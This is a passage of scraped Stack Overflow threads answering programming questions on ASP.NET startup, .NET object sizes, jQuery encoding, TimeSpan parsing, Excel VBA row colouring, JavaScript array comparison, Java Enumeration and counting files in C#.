<p>I don't have any code at Application start.
I don't have cached items.</p>

<p>Any ideas? How can I find out what is happening?</p>
 <p>This sounds very much like background compiling; though if you're precompiling, that shouldn't be an issue.</p>

<p>First thing I would look at is your ORM (if any). NHibernate, in particular, has a serious startup penalty, as it runs multiple compilers in the background at startup to turn each class in your data layer into its own in-memory assembly.</p>
 <p>When you published the site, did you choose to make the website ""updatable"" in the publish website's settings or not? If I remember well, the aspx / ascx file need to be compiled as well, and if they are ""updatable"" then the first start will cause a recompile of those resources.</p>
 <p>Have you turned on <a href=""http://msdn.microsoft.com/en-us/library/y13fw6we.aspx"" rel=""nofollow"">tracing</a> in your web.config?</p>
 <p>It's just your app domain loading up and loading any binaries into memory. Also, it's initializing static variables, so if you have a static variable that loads up a lot of data from the db, it might take a bit.</p>
 <p>Just a quick nod at Darren. That's typical behavior of a .NET app after a DLL update is made. After the initial load everything should zip along just fine.</p>
 <p>When you say ""precompile"" the site, are you using the <a href=""http://msdn.microsoft.com/en-us/library/ms229863%28VS.80%29.aspx"" rel=""nofollow"">aspnet_compiler</a> utility to precompile, or simply using the ""Build site"" option in Visual Studio?</p>

<p>If you are not carrying out the former, I recommend <a href=""http://odetocode.com/blogs/scott/archive/2006/10/17/8190.aspx"" rel=""nofollow"">giving it a spin</a>. Coupled with <a href=""http://msdn.microsoft.com/en-us/asp.net/aa336619.aspx"" rel=""nofollow"">Web Deployment Projects</a>, you should have an easier time deploying your site for each release.</p>
 <p>The initial slowness is a couple things:</p>

<ul>
<li>The appDomain is being setup</li>
<li>ASP.NET is parsing and compiling the ASPX pages. </li>
<li>Global Contexts are being initialized.</li>
</ul>

<p>This is normal behavior for ASP.NET.</p>
 <blockquote>
  <p>@Mickey: No, it is turned off. Do I need to turn it on to find out?</p>
</blockquote>

<p>The trace log will show you how long each action takes.  It could help you find what is taking so long.</p>

<p><a href=""http://davidhayden.com/blog/dave/archive/2005/07/17/2396.aspx"" rel=""nofollow"">Here</a> is a link that might help you get it setup.</p>
 <p>Try clearing your event log?</p>
 <p>use <a href=""http://www.iis.net/expand/ApplicationWarmUp"" rel=""nofollow"">http://www.iis.net/expand/ApplicationWarmUp</a> for warming up your app
this is for IIS 7.5 - so if you are running on Server R2 then it will work.</p>
 <p>Make sure you publish your application in 'release' and not 'debug'. I've noticed this decreases loading time considerably. The web.config file will be updated.</p>
"
"sizeof() equivalent for reference types? <p>I'm looking for a way to get the size of an instance of a reference type. sizeof is only for value types. Is this possible?</p>
 <p>You need <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.sizeof.aspx"">Marshal.SizeOf</a></p>

<p><strong>Edit:</strong> This <em>is</em> for unsafe code, but then, so is sizeof().</p>
 <p>Beware that Marshal.SizeOf is for unsafe code...</p>

<p>I don't think it's possible for managed code though, maybe you can explain your problem, there may be another way to solve it</p>
 <p>If you don't mind it being a little less accurate than perfect, and for comparative purposes, you could serialize the object/s and measure that (in bytes for example)</p>

<p><em>EDIT (I kept thinking after posting)</em>: Because it's a little more complicated than sizeof for valuetypes, for example: reference types can have references to other objects and so on... there's not an exact and easy way to do it that I know of...</p>
 <p>If you can - Serialize it!</p>

<pre><code>Dim myObjectSize As Long

Dim ms As New IO.MemoryStream
Dim bf As New Runtime.Serialization.Formatters.Binary.BinaryFormatter()
bf.Serialize(ms, myObject)
myObjectSize = ms.Position
</code></pre>
 <p>I had a similar question recently and wanted to know the size of Object and LinkedListNode in C#. To solve the problem, I developed a <a href=""http://www.grantjenks.com/wiki/random/net_sizeof_reference_type"" rel=""nofollow"">program</a> that would:</p>

<ol>
<li>Measure the program's ""Working Set""</li>
<li>Allocate a lot of objects.</li>
<li>Measure the ""Working Set"" again.</li>
<li>Divide the difference by the number of allocated objects.</li>
</ol>

<p>On my computer (64-bit), I got the following data:</p>

<pre><code>Measuring Object:
iter    working set     size estimate
-1      11190272
1000000 85995520        74.805248
2000000 159186944       73.998336
3000000 231473152       73.4276266666667
4000000 306401280       73.802752
5000000 379092992       73.580544
6000000 451387392       73.3661866666667
7000000 524378112       73.3125485714286
8000000 600096768       73.613312
9000000 676405248       73.9127751111111
Average size: 73.7577032239859
Measuring LinkedListNode&lt;Object&gt;:
iter    working set     size estimate
-1      34168832
1000000 147959808       113.790976
2000000 268963840       117.397504
3000000 387796992       117.876053333333
4000000 507973632       118.4512
5000000 628379648       118.8421632
6000000 748834816       119.110997333333
7000000 869265408       119.299510857143
8000000 993509376       119.917568
9000000 1114038272      119.985493333333
Average size: 118.296829561905
Estimated Object size: 29.218576886067
Estimated LinkedListNode&lt;reference type&gt; size: 44.5391263379189
</code></pre>

<p>Based on the data, the average size of allocating millions of Objects is approximately 29.2 bytes. A LinkedListNode object is approximately 44.5 bytes. This data illustrates two things:</p>

<ol>
<li>It's very unlikely that the system is allocating a partial byte. The fractional measure of bytes indicates the overhead the CLR requires to allocate and track millions of reference types.</li>
<li>If we simply round-down the number of bytes, we're still unlikely to have the proper byte count for reference types. This is clear from the measure of Objects. If we round down, we assume the size is 29 bytes which, while theoretically possible, is unlikely because of padding. In order to improve performance, object allocations are usually padded for alignment purposes. I would guess that CLR objects will be 4 byte aligned.</li>
</ol>

<p>Assuming CLR overhead and 4-byte alignment, I'd estimate an Object in C# is 28 bytes and a LinkedListNode is 44 bytes.</p>

<p>BTW Jon Skeet had the idea for the method above before I did and stated it in <a href=""http://stackoverflow.com/questions/207592/getting-the-size-of-a-field-in-bytes-with-c#207605"">this answer</a> to a similar question.</p>
 <p>Please refer my answer in the below link.</p>

<p>It is possible via .sos.dll debugger extension</p>

<p><a href=""http://stackoverflow.com/questions/324053/find-out-the-size-of-a-net-object/7122653#7122653"">Find out the size of a .net object</a></p>
"
"How to set encoding in .getJSON JQuery <p>In my web app, I submit some form fields with jQuery <code>$.getJSON()</code> Method. I am having some problems with the encoding. The character-set of my app is <code>charset=ISO-8859-1</code> but I think these fields are submitted with <code>UTF-8</code>. </p>

<p>Does anyone know, how I can set encoding in <code>$.getJSON</code> calls? </p>
 <p>I think that you'll probably have to use <a href=""http://docs.jquery.com/Ajax/jQuery.ajax#options""><code>$.ajax()</code></a> if you want to change the encoding, see the <code>contentType</code> param below (the <code>success</code> and <code>error</code> callbacks assume you have <code>&lt;div id=""success""&gt;&lt;/div&gt;</code> and <code>&lt;div id=""error""&gt;&lt;/div&gt;</code> in the html):</p>

<pre><code>$.ajax({
    type: ""POST"",
    url: ""SomePage.aspx/GetSomeObjects"",
    contentType: ""application/json; charset=utf-8"",
    dataType: ""json"",
    data: ""{id: '"" + someId + ""'}"",
    success: function(json) {
        $(""#success"").html(""json.length="" + json.length);
        itemAddCallback(json);
    },
    error: function (xhr, textStatus, errorThrown) {
        $(""#error"").html(xhr.responseText);
    }
});
</code></pre>

<p>I actually just had to do this about an hour ago, what a coincidence!</p>
 <p>If you want to use <code>$.getJSON()</code> you can add the following before the call :</p>

<pre><code>$.ajaxSetup({
    scriptCharset: ""utf-8"",
    contentType: ""application/json; charset=utf-8""
});
</code></pre>

<p>You can use the charset you want instead of <code>utf-8</code>.</p>

<p>The options are explained <a href=""http://docs.jquery.com/Ajax/jQuery.ajax#toptions"" rel=""nofollow"">here</a>.</p>

<p><code>contentType :</code> When sending data to the server, use this <code>content-type</code>. Default is <code>application/x-www-form-urlencoded</code>, which is fine for most cases.</p>

<p><code>scriptCharset :</code> Only for requests with <code>jsonp</code> or <code>script</code> dataType and GET type. Forces the request to be interpreted as a certain charset. Only needed for charset differences between the remote and local content.</p>

<p>You may need one or both ...</p>
 <p>Use <code>encodeURI()</code> in client JS and use <code>URLDecoder.decode()</code> in server Java side works.</p>

<hr>

<p>Example: </p>

<ul>
<li><p><strong>Javascript</strong>:</p>

<pre><code>$.getJSON(
    url,
    {
        ""user"": encodeURI(JSON.stringify(user))
    },
    onSuccess
);
</code></pre></li>
<li><p><strong>Java</strong>:</p>

<p><code>java.net.URLDecoder.decode(params.user, ""UTF-8"");</code></p></li>
</ul>
 <p>You need to analyze the JSON calls using Wireshark, so you will see if you include the charset in the formation of the JSON page or not, for example:</p>

<ul>
<li>If the page is simple if text / html</li>
</ul>

<pre>
0000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d   HTTP/1.1  200 OK.
0010  0a 43 6f 6e 74 65 6e 74  2d 54 79 70 65 3a 20 74   .Content -Type: t
0020  65 78 74 2f 68 74 6d 6c  0d 0a 43 61 63 68 65 2d   ext/html ..Cache-
0030  43 6f 6e 74 72 6f 6c 3a  20 6e 6f 2d 63 61 63 68   Control:  no-cach
</pre>

<ul>
<li>If the page is of the type including custom JSON with MIME ""charset = ISO-8859-1""</li>
</ul>

<pre>
0000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d   HTTP/1.1  200 OK.
0010  0a 43 61 63 68 65 2d 43  6f 6e 74 72 6f 6c 3a 20   .Cache-C ontrol: 
0020  6e 6f 2d 63 61 63 68 65  0d 0a 43 6f 6e 74 65 6e   no-cache ..Conten
0030  74 2d 54 79 70 65 3a 20  74 65 78 74 2f 68 74 6d   t-Type:  text/htm
0040  6c 3b 20 63 68 61 72 73  65 74 3d 49 53 4f 2d 38   l; chars et=ISO-8
0050  38 35 39 2d 31 0d 0a 43  6f 6e 6e 65 63 74 69 6f   859-1..C onnectio
</pre>

<p>Why is that? because we can not put on the page of JSON a goal like this:
</p>

<p>In my case I use the manufacturer Connect Me 9210 Digi:</p>

<ul>
<li>I had to use a flag to indicate that one would use non-standard MIME:
                 p-> theCgiPtr-> = fDataType eRpDataTypeOther;</li>
<li>It added the new MIME in the variable:
                 strcpy (p-> theCgiPtr-> fOtherMimeType, ""text / html;
charset = ISO-8859-1 "");</li>
</ul>

<p><strong>It worked for me</strong> without having to convert the data passed by JSON for UTF-8 and then redo the conversion on the page ...</p>
 <p>Use this function to regain the utf-8 characters</p>

<pre><code>function decode_utf8(s) { 

  return decodeURIComponent(escape(s)); 

}
</code></pre>

<p>example:</p>

<pre><code>var new_Str=decode_utf8(str);
</code></pre>
"
"Parse string to TimeSpan <p>I have some strings of xxh:yym format where xx is hours and yy is minutes like ""05h:30m"". What is an elegant way to convert a string of this type to TimeSpan?</p>
 <p>This seems to work, though it is a bit hackish:</p>

<pre><code>TimeSpan span;


if (TimeSpan.TryParse(""05h:30m"".Replace(""m"","""").Replace(""h"",""""), out span))
            MessageBox.Show(span.ToString());
</code></pre>
 <p>Are <a href=""http://msdn.microsoft.com/en-us/library/system.timespan.parse.aspx"" rel=""nofollow"">TimeSpan.Parse</a> and <a href=""http://msdn.microsoft.com/en-us/library/system.timespan.tryparse.aspx"" rel=""nofollow"">TimeSpan.TryParse</a> not options?  If you aren't using an ""approved"" format, you'll need to do the parsing manually.  I'd probably capture your two integer values in a regular expression, and then try to parse them into integers, from there you can create a new TimeSpan with its constructor.</p>
 <p><code>DateTime.ParseExact</code> or <code>DateTime.TryParseExact</code> lets you specify the exact format of the input. After you get the <code>DateTime</code>, you can grab the <code>DateTime.TimeOfDay</code> which is a <code>TimeSpan</code>.</p>

<p>In the absence of <code>TimeSpan.TryParseExact</code>, I think an 'elegant' solution is out of the mix.</p>

<p>@buyutec As you suspected, this method would not work if the time spans have more than 24 hours.</p>
 <p>Here'e one possibility:</p>

<pre><code>TimeSpan.Parse(s.Remove(2, 1).Remove(5, 1));
</code></pre>

<p>And if you want to make it more elegant in your code, use an extension method:</p>

<pre><code>public static TimeSpan ToTimeSpan(this string s)
{
  TimeSpan t = TimeSpan.Parse(s.Remove(2, 1).Remove(5, 1));
  return t;
}
</code></pre>

<p>Then you can do </p>

<pre><code>""05h:30m"".ToTimeSpan();
</code></pre>
 <p>From another thread:</p>

<p><a href=""http://stackoverflow.com/questions/62804/how-to-convert-xs-duration-to-timespan-in-vb-net/63219#63219"">How to convert xs:duration to timespan</a></p>
"
"Alternating coloring groups of rows in Excel <p>I have an Excel Spreadsheet like this</p>

<pre>
id | data for id
   | more data for id
id | data for id
id | data for id
   | more data for id
   | even more data for id
id | data for id
   | more data for id
id | data for id
id | data for id
   | more data for id
</pre>

<p>Now I want to group the data of one id by alternating the background color of the rows</p>

<pre>
var color = white
for each row
    if the first cell is not empty and color is white
        set color to green
    if the first cell is not empty and color is green
        set color to white
    set background of row to color
</pre>

<p>Can anyone help me with a macro or some VBA code</p>

<p>Thanks</p>
 <p>If you select the Conditional Formatting menu option under the Format menu item, you will be given a dialog that lets you construct some logic to apply to that cell.</p>

<p>Your logic might not be the same as your code above, it might look more like:</p>

<p>Cell Value is | equal to |  | and | White   .... Then choose the color.</p>

<p>You can select the add button and make the condition as large as you need.</p>
 <p>Do you have to use code?
if the table is static, then why not use the auto formatting capability?</p>

<p><img src=""http://i.stack.imgur.com/7gJRz.jpg"" alt=""enter image description here""></p>

<p>It may also help if you ""merge cells"" of the same data. so maybe if you merge the cells of the ""data, more data, even more data"" into one cell, you can more easily deal with classic ""each row is a row"" case.</p>
 <p>I think this does what you are looking for.  Flips color when the cell in column A changes value.  Runs until there is no value in column B.</p>

<pre><code>Public Sub HighLightRows()
    Dim i As Integer
    i = 1
    Dim c As Integer
    c = 3       'red

    Do While (Cells(i, 2) &lt;&gt; """")
        If (Cells(i, 1) &lt;&gt; """") Then    'check for new ID
            If c = 3 Then
                c = 4   'green
            Else
                c = 3   'red
            End If
        End If

        Rows(Trim(Str(i)) + "":"" + Trim(Str(i))).Interior.ColorIndex = c
        i = i + 1
    Loop
End Sub
</code></pre>
 <p>I use this formula to get the input for a conditional formatting:</p>

<pre><code>=IF(B2=B1,E1,MOD(E1+1,2))    [content of cell E2]
</code></pre>

<p>Where column B contains the item that needs to be grouped and E is an auxiliary column. Every time that the upper cell (B1 on this case) is the same as the current one (B2), the upper row content from column E is returned. Otherwise, it will return that content plus 1 MOD 2 (that is, the outupt will be 0 or 1, depending on the value of the upper cell).</p>

<p><img src=""http://i.stack.imgur.com/H6WP0.png"" alt=""enter image description here""></p>

<p><img src=""http://i.stack.imgur.com/sE57q.png"" alt=""enter image description here""></p>

<p><img src=""http://i.stack.imgur.com/4hadL.png"" alt=""enter image description here""></p>
 <p>Based on Jason Z's answer, which from my tests seems to be wrong (at least on Excel 2010), here's a bit of code that happens to work for me :</p>

<pre><code>Public Sub HighLightRows()
    Dim i As Integer
    i = 2 'start at 2, cause there's nothing to compare the first row with
    Dim c As Integer
    c = 2       'Color 1. Check http://dmcritchie.mvps.org/excel/colors.htm for color indexes

    Do While (Cells(i, 1) &lt;&gt; """")
        If (Cells(i, 1) &lt;&gt; Cells(i - 1, 1)) Then 'check for different value in cell A (index=1)
            If c = 2 Then
                c = 34   'color 2
            Else
                c = 2   'color 1
            End If
        End If

        Rows(Trim(Str(i)) + "":"" + Trim(Str(i))).Interior.ColorIndex = c
        i = i + 1
    Loop
End Sub
</code></pre>
 <p>I'm barrowing this and tried to modify it for my use. I have order numbers in column a and some orders take multiple rows. Just want to alternate the white and gray per order number. What I have here alternates each row.</p>

<p><code>
ChangeBackgroundColor()
' ChangeBackgroundColor Macro
'
' Keyboard Shortcut: Ctrl+Shift+B
Dim a As Integer
    a = 1
    Dim c As Integer
    c = 15       'gray
    Do While (Cells(a, 2) &lt;> """")
        If (Cells(a, 1) &lt;> """") Then    'check for new ID
            If c = 15 Then
                c = 2   'white
            Else
                c = 15   'gray
            End If
        End If
        Rows(Trim(Str(a)) + "":"" + Trim(Str(a))).Interior.ColorIndex = c
        a = a + 1
    Loop</p>

<p>End Sub</code></p>
 <p>I have reworked Bartdude's answer, for Light Grey / White based upon a configurable column, using RGB values. A boolean var is flipped when the value changes and this is  used to index the colours array via the integer values of True and False. Works for me on 2010. Call the sub with the sheet number.</p>

<pre><code>Public Sub HighLightRows(intSheet As Integer)
    Dim intRow As Integer: intRow = 2 ' start at 2, cause there's nothing to compare the first row with
    Dim intCol As Integer: intCol = 1 ' define the column with changing values
    Dim Colr1 As Boolean: Colr1 = True ' Will flip True/False; adding 2 gives 1 or 2
    Dim lngColors(2 + True To 2 + False) As Long   ' Indexes : 1 and 2
          ' True = -1, array index 1.    False = 0, array index 2.
    lngColors(2 + False) = RGB(235, 235, 235) ' lngColors(2) = light grey
    lngColors(2 + True) = RGB(255, 255, 255) '  lngColors(1) = white

    Do While (Sheets(intSheet).Cells(intRow, 1) &lt;&gt; """")
        'check for different value in intCol, flip the boolean if it's different
        If (Sheets(intSheet).Cells(intRow, intCol) &lt;&gt; Sheets(intSheet).Cells(intRow - 1, intCol)) Then Colr1 = Not Colr1
        Sheets(intSheet).Rows(intRow).Interior.Color = lngColors(2 + Colr1) ' one colour or the other
        ' Optional : retain borders (these no longer show through when interior colour is changed) by specifically setting them
        With Sheets(intSheet).Rows(intRow).Borders
            .LineStyle = xlContinuous
            .Weight = xlThin
            .Color = RGB(220, 220, 220)
        End With
        intRow = intRow + 1
    Loop
End Sub
</code></pre>

<p>Optional bonus : for SQL data, colour any NULL values with the same yellow as used in SSMS</p>

<pre><code>Public Sub HighLightNULLs(intSheet As Integer)
    Dim intRow As Integer: intRow = 2 ' start at 2 to avoid the headings
    Dim intCol As Integer
    Dim lngColor As Long: lngColor = RGB(255, 255, 225) ' pale yellow

    For intRow = intRow To Sheets(intSheet).UsedRange.Rows.Count
        For intCol = 1 To Sheets(intSheet).UsedRange.Columns.Count
            If Sheets(intSheet).Cells(intRow, intCol) = ""NULL"" Then Sheets(intSheet).Cells(intRow, intCol).Interior.Color = lngColor
        Next intCol
    Next intRow
End Sub
</code></pre>
 <p>I use this rule in Excel to format alternating rows:</p>

<ol>
<li>Highlight the rows you wish to apply an alternating style to.</li>
<li>Press ""Conditional Formatting"" -> New Rule</li>
<li>Select ""Use a formula to determine which cells to format"" (last entry)</li>
<li>Enter rule in format value: <strong><code>=MOD(ROW(),2)=0</code></strong></li>
<li>Press ""Format"", make required formatting for alternating rows, eg. Fill -> Color.</li>
<li>Press OK, Press OK.</li>
</ol>

<p>If you wish to format alternating columns instead, use <strong><code>=MOD(COLUMN(),2)=0</code></strong></p>

<p>Voila!</p>
"
"Comparing Arrays of Objects in JavaScript <p>I want to compare 2 arrays of objects in JavaScript code.  The objects have 8 total properties, but each object will not have a value for each, and the arrays are never going to be any larger than 8 items each, so maybe the brute force method of traversing each and then looking at the values of the 8 properties is the easiest way to do what I want to do, but before implementing, I wanted to see if anyone had a more elegant solution. Any thoughts?</p>
 <p>EDIT: You cannot overload operators in current, common browser-based implementations of JavaScript interpreters.</p>

<p>To answer the original question, one way you could do this, and mind you, this is a bit of a hack, simply <a href=""https://github.com/douglascrockford/JSON-js/blob/master/json2.js"">serialize the two arrays to JSON</a> and then compare the two JSON strings. That would simply tell you if the arrays are different, obviously you could do this to <em>each</em> of the objects within the arrays as well to see which ones were different.</p>

<p>Another option is to use a library which has some nice facilities for comparing objects - I use and recommend <a href=""http://www.mochikit.com/""><strong>MochiKit</strong></a>.</p>

<hr>

<p><strong>EDIT:</strong> <a href=""http://stackoverflow.com/questions/27030/comparing-arrays-of-objects-in-javascript#27932"">The answer kamens gave</a> deserves consideration as well, since a single function to compare two given objects would be much smaller than any library to do what I suggest (although my suggestion would certainly work well enough).</p>

<p>Here is a naïve implemenation that may do just enough for you - be aware that there are potential problems with this implementation:</p>

<pre><code>function objectsAreSame(x, y) {
   var objectsAreSame = true;
   for(var propertyName in x) {
      if(x[propertyName] !== y[propertyName]) {
         objectsAreSame = false;
         break;
      }
   }
   return objectsAreSame;
}
</code></pre>

<p>The assumption is that both objects have the same exact list of properties.</p>

<p>Oh, and it is probably obvious that, for better or worse, I belong to the only-one-return-point camp. :)</p>
 <p>Honestly, with 8 objects max and 8 properties max per object, your best bet is to just traverse each object and make the comparisons directly.  It'll be fast and it'll be easy.</p>

<p>If you're going to be using these types of comparisons often, then I agree with Jason about JSON serialization...but otherwise there's no need to slow down your app with a new library or JSON serialization code.</p>
 <p>The objectsAreSame function mentioned in Jason's answer works fine for me. However, there's a little problem: If <code>x[propertyName]</code> and <code>y[propertyName]</code> are objects (<code>typeof x[propertyName] == 'object'</code>), you'll need to call the function recursively in order to compare them.</p>
 <p>I have worked a bit on a simple algorithm to compare contents of two objects and return an intelligible list of difference. Thought I would share. It borrows some ideas for jQuery, namely the map function implementation and the object and array type checking. </p>

<p>It returns a list of ""diff objects"", which are arrays with the diff info. It's very simple.</p>

<p>Here it is: </p>

<pre><code>// compare contents of two objects and return a list of differences
// returns an array where each element is also an array in the form:
// [accessor, diffType, leftValue, rightValue ]
//
// diffType is one of the following:
//   value: when primitive values at that index are different
//   undefined: when values in that index exist in one object but don't in 
//              another; one of the values is always undefined
//   null: when a value in that index is null or undefined; values are
//         expressed as boolean values, indicated wheter they were nulls
//   type: when values in that index are of different types; values are 
//         expressed as types
//   length: when arrays in that index are of different length; values are
//           the lengths of the arrays
//

function DiffObjects(o1, o2) {
    // choose a map() impl.
    // you may use $.map from jQuery if you wish
    var map = Array.prototype.map?
        function(a) { return Array.prototype.map.apply(a, Array.prototype.slice.call(arguments, 1)); } :
        function(a, f) { 
            var ret = new Array(a.length), value;
            for ( var i = 0, length = a.length; i &lt; length; i++ ) 
                ret[i] = f(a[i], i);
            return ret.concat();
        };

    // shorthand for push impl.
    var push = Array.prototype.push;

    // check for null/undefined values
    if ((o1 == null) || (o2 == null)) {
        if (o1 != o2)
            return [["""", ""null"", o1!=null, o2!=null]];

        return undefined; // both null
    }
    // compare types
    if ((o1.constructor != o2.constructor) ||
        (typeof o1 != typeof o2)) {
        return [["""", ""type"", Object.prototype.toString.call(o1), Object.prototype.toString.call(o2) ]]; // different type

    }

    // compare arrays
    if (Object.prototype.toString.call(o1) == ""[object Array]"") {
        if (o1.length != o2.length) { 
            return [["""", ""length"", o1.length, o2.length]]; // different length
        }
        var diff =[];
        for (var i=0; i&lt;o1.length; i++) {
            // per element nested diff
            var innerDiff = DiffObjects(o1[i], o2[i]);
            if (innerDiff) { // o1[i] != o2[i]
                // merge diff array into parent's while including parent object name ([i])
                push.apply(diff, map(innerDiff, function(o, j) { o[0]=""["" + i + ""]"" + o[0]; return o; }));
            }
        }
        // if any differences were found, return them
        if (diff.length)
            return diff;
        // return nothing if arrays equal
        return undefined;
    }

    // compare object trees
    if (Object.prototype.toString.call(o1) == ""[object Object]"") {
        var diff =[];
        // check all props in o1
        for (var prop in o1) {
            // the double check in o1 is because in V8 objects remember keys set to undefined 
            if ((typeof o2[prop] == ""undefined"") &amp;&amp; (typeof o1[prop] != ""undefined"")) {
                // prop exists in o1 but not in o2
                diff.push([""["" + prop + ""]"", ""undefined"", o1[prop], undefined]); // prop exists in o1 but not in o2

            }
            else {
                // per element nested diff
                var innerDiff = DiffObjects(o1[prop], o2[prop]);
                if (innerDiff) { // o1[prop] != o2[prop]
                    // merge diff array into parent's while including parent object name ([prop])
                    push.apply(diff, map(innerDiff, function(o, j) { o[0]=""["" + prop + ""]"" + o[0]; return o; }));
                }

            }
        }
        for (var prop in o2) {
            // the double check in o2 is because in V8 objects remember keys set to undefined 
            if ((typeof o1[prop] == ""undefined"") &amp;&amp; (typeof o2[prop] != ""undefined"")) {
                // prop exists in o2 but not in o1
                diff.push([""["" + prop + ""]"", ""undefined"", undefined, o2[prop]]); // prop exists in o2 but not in o1

            }
        }
        // if any differences were found, return them
        if (diff.length)
            return diff;
        // return nothing if objects equal
        return undefined;
    }
    // if same type and not null or objects or arrays
    // perform primitive value comparison
    if (o1 != o2)
        return [["""", ""value"", o1, o2]];

    // return nothing if values are equal
    return undefined;
}
</code></pre>
 <p>I know this is an old question and the answers provided work fine ... but this is a bit shorter and doesn't require any additional libraries ( i.e. JSON ):</p>

<pre><code>function arraysAreEqual(ary1,ary2){
  return (ary1.join('') == ary2.join(''));
}
</code></pre>
 <p>Please try this one </p>

<pre><code> function used_to_compare_two_arrays(a,b)
     {
///this block will make the array of indexed that array b contains a elements
       var c = a.filter(function(value, index, obj)
       {
        return b.indexOf(value) &gt; -1;
         });
    ///this is used for making comparison that both have same length if no condition go wrong 
    if (c.length !== a.length) {
        return 0;
    }
    else{
      return 1;
    }

     }
</code></pre>
"
"Why aren't Enumerations Iterable? <p>In Java 5 and above you have the foreach loop, which works magically on anything that implements <code>Iterable</code>:</p>

<pre><code>for (Object o : list) {
  doStuff(o);
}
</code></pre>

<p>However, <code>Enumerable</code> still does not implement <code>Iterable</code>, meaning that to iterate over an <code>Enumeration</code> you must do the following:</p>

<pre><code>for(; e.hasMoreElements() ;) {
  doStuff(e.nextElement());
}
</code></pre>

<p>Does anyone know if there is a reason why <code>Enumeration</code> still does not implement <code>Iterable</code>?</p>

<p><strong>Edit:</strong> As a clarification, I'm not talking about the language concept of an <a href=""http://en.wikipedia.org/wiki/Enumerated_type"" rel=""nofollow"">enum</a>, I'm talking a Java-specific class in the Java API called '<a href=""http://java.sun.com/j2se/1.5.0/docs/api/java/util/Enumeration.html"" rel=""nofollow"">Enumeration</a>'. </p>
 <p>Enumeration hasn't been modified to support Iterable because it's an interface not a concrete class (like Vector, which was modifed to support the Collections interface).</p>

<p>If Enumeration was changed to support Iterable it would break a bunch of people's code.</p>
 <p>AFAIK Enumeration is <a href=""http://java.sun.com/javase/6/docs/api/java/util/Iterator.html"">kinda ""deprecated""</a>:</p>

<blockquote>
  <p>Iterator takes the place of
  Enumeration in the Java collections
  framework</p>
</blockquote>

<p>I hope they'll change the Servlet API with JSR 315 to use Iterator instead of Enumeration. </p>
 <p>It doesn't make sense for <code>Enumeration</code> to implement <code>Iterable</code>. <code>Iterable</code> is a factory method for <code>Iterator</code>. <code>Enumeration</code> is analogous to <code>Iterator</code>, and only maintains state for a single enumeration.</p>

<p>So, be careful trying to wrap an <code>Enumeration</code> as an <code>Iterable</code>. If someone passes me an <code>Iterable</code>, I will assume that I can call <code>iterator()</code> on it repeatedly, creating as many <code>Iterator</code> instances as I want, and iterating independently on each. A wrapped <code>Enumeration</code> will not fulfill this contract; don't let your wrapped <code>Enumeration</code> escape from your own code. (As an aside, I noticed that Java 7's <a href=""http://docs.oracle.com/javase/7/docs/api/java/nio/file/DirectoryStream.html""><code>DirectoryStream</code></a> violates expectations in just this way, and shouldn't be allowed to ""escape"" either.)</p>

<p><code>Enumeration</code> is like an <code>Iterator</code>, not an <code>Iterable</code>. A <code>Collection</code> is <code>Iterable</code>. An <code>Iterator</code> is not.</p>

<p>You can't do this:</p>

<pre><code>Vector&lt;X&gt; list = …
Iterator&lt;X&gt; i = list.iterator();
for (X x : i) {
    x.doStuff();
}
</code></pre>

<p>So it wouldn't make sense to do this:</p>

<pre><code>Vector&lt;X&gt; list = …
Enumeration&lt;X&gt; i = list.enumeration();
for (X x : i) {
    x.doStuff();
}
</code></pre>

<p>There is no <code>Enumerable</code> equivalent to <code>Iterable</code>. It could be added without breaking anything to work in for loops, but what would be the point? If you are able to implement this new <code>Enumerable</code> interface, why not just implement <code>Iterable</code> instead?</p>
 <p>As an easy and <strong>clean</strong> way of using an Enumeration with the enhanced for loop, convert to an ArrayList with java.util.Collections.list.</p>

<pre><code>for (TableColumn col : Collections.list(columnModel.getColumns()) {
</code></pre>

<p>(javax.swing.table.TableColumnModel.getColumns returns Enumeration.)</p>

<p>Note, this may be very slightly less efficient.</p>
 <p>If you would just like it to be syntactically a little cleaner, you can use:</p>

<pre><code>while(e.hasMoreElements()) {
  doStuff(e.nextElement());
}
</code></pre>
"
"Find number of files with a specific extension, in all subdirectories <p>Is there a way to find the number of files of a specific type without having to loop through all results inn a Directory.GetFiles() or similar method? I am looking for something like this:</p>

<pre><code>int ComponentCount = MagicFindFileCount(@""c:\windows\system32"", ""*.dll"");
</code></pre>

<p>I know that I can make a recursive function to call Directory.GetFiles , but it would be much cleaner if I could do this without all the iterating.</p>

<p><strong>EDIT:</strong> If it is not possible to do this without recursing and iterating yourself, what would be the best way to do it?</p>
 <p>Someone has to do the iterating part.</p>

<p>AFAIK, there is no such method present in .NET already, so I guess that someone has to be you.</p>
 <p>You should use the <a href=""http://msdn.microsoft.com/en-us/library/ms143316.aspx"" rel=""nofollow"">Directory.GetFiles(path, searchPattern, SearchOption)</a> overload of Directory.GetFiles().</p>

<p>Path specifies the path, searchPattern specifies your wildcards (e.g., *, *.format) and SearchOption provides the option to include subdirectories.</p>

<p>The Length property of the return array of this search will provide the proper file count for your particular search pattern and option:</p>

<pre><code>string[] files = directory.GetFiles(@""c:\windows\system32"", ""*.dll"", SearchOption.AllDirectories);

return files.Length;
</code></pre>

<p><strong>EDIT:</strong> Alternatively you can use <a href=""https://msdn.microsoft.com/en-us/library/system.io.directory.enumeratefiles(v=vs.110).aspx"" rel=""nofollow"">Directory.EnumerateFiles method</a></p>

<pre><code>return Directory.EnumerateFiles(@""c:\windows\system32"", ""*.dll"", SearchOption.AllDirectories).Count();
</code></pre>
 <p>You can use this overload of GetFiles:</p>

<blockquote>
  <p><a href=""http://msdn.microsoft.com/en-us/library/ms143316.aspx""> Directory.GetFiles Method (String,
   String, SearchOption</a>)</p>
</blockquote>

<p>and this member of SearchOption:</p>

<blockquote>
  <p><strong>AllDirectories</strong> - Includes the current
  directory and all the subdirectories
  in a search operation. This option
  includes reparse points like mounted
  drives and symbolic links in the
  search.</p>
</blockquote>

<p>GetFiles returns an array of string so you can just get the Length which is the number of files found.</p>
 <p>Using recursion your MagicFindFileCount would look like this:</p>

<pre><code>private int MagicFindFileCount( string strDirectory, string strFilter ) {
     int nFiles = Directory.GetFiles( strDirectory, strFilter ).Length;

     foreach( String dir in Directory.GetDirectories( strDirectory ) ) {
        nFiles += GetNumberOfFiles(dir, strFilter);
     }

     return nFiles;
  }
</code></pre>

<p>Though <a href=""http://stackoverflow.com/questions/27570/find-number-of-files-in-all-subdirectories#27584"" rel=""nofollow"">Jon's solution</a> might be the better one.</p>
